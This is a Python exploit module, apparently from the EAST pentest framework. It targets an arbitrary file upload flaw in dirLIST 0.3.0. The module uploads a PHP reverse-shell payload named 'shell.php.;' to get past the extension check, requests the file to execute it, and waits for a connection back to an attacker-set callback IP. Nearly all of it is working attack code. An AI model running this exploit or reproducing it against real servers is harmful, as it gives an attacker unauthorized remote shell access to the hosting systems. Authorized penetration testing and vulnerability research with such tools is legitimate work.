#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import urllib2
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_dirlist_fu"
INFO['DESCRIPTION'] = "dirLIST 0.3.0 - Arbitrary File Upload"
INFO['VENDOR'] = "https://sourceforge.net/projects/dir-list/"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/3133e43f7dbeae5f2b7e83a19b910e42-dirLIST_0.3.0.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41083/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """dirLIST displays files and folders in a given HTTP/FTP directory. It has a wonderful interface with choice of Thumbnail or List view along with gorgeous icons for different file types. Includes a sleek gallery, web based mp3 player, file admin + more.
However, appending a semicolon ";" to end of our PHP file will skirt the security check allowing
us to upload a banned PHP file type, and our PHP file will be executed by server when accessed later.
 
Apache manual:
“Files can have more than one extension, and the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr
maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. etc..
 
Therefore, a file named ‘file.php.1’, can be interpreted as a PHP file and be executed on server. 
This usually works if the last extension is not specified in the list of mime-types known to the web server. 
 
Developers are usually unaware of the "Apache" feature to process files with some odd unexpected extension like PHP.1, PHP.; and such.
"""

INFO['CHANGELOG'] = "19 Jan, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/dirLIST', dict(description = 'Basepath')
OPTIONS["CALLBACK_IP"] = "127.0.0.1", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.basepath = OPTIONS["BASEPATH"]
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
        
    def make_data(self, content):
        data = '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="shell.php.;"\r\n'
        data += 'Content-Type: application/octet-stream\r\n\r\n'
        data += content
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="submit"\r\n\r\n'
        data += 'Upload'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="folder"\r\n\r\n'
        data += ''
        data += '\r\n--o0oOo0o--\r\n'
        return data
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        self.log('Get cookies ...')
        fd = urllib2.urlopen(self.make_url('/index.php'))
        cookie = fd.headers['set-cookie']
        self.log('Cookies: ' + cookie)
        
        self.log('Set language 0')
        request = urllib2.Request(self.make_url('/dirLIST_files/set_language.php?folder=&lang_id=0'))
        request.add_header('Cookie', cookie)
        fd = urllib2.urlopen(request)
        
        self.log('OK. Try to upload shell.php.;')
        data = self.make_data(self.make_sploit()[1:])
        request = urllib2.Request(self.make_url('/dirLIST_files/process_upload.php'), data)
        request.add_header('Content-Length', len(data))
        request.add_header('Content-Type', 'multipart/form-data; boundary=o0oOo0o')
        request.add_header('Cookie', cookie)
        
        self.log('Uploading shell.php.;')
        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('All files uploaded. Execute shell.php.; ...')
        try:
            urllib2.urlopen(self.make_url('/shell.php.;'), timeout=3)
        except Exception as e:
            pass
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
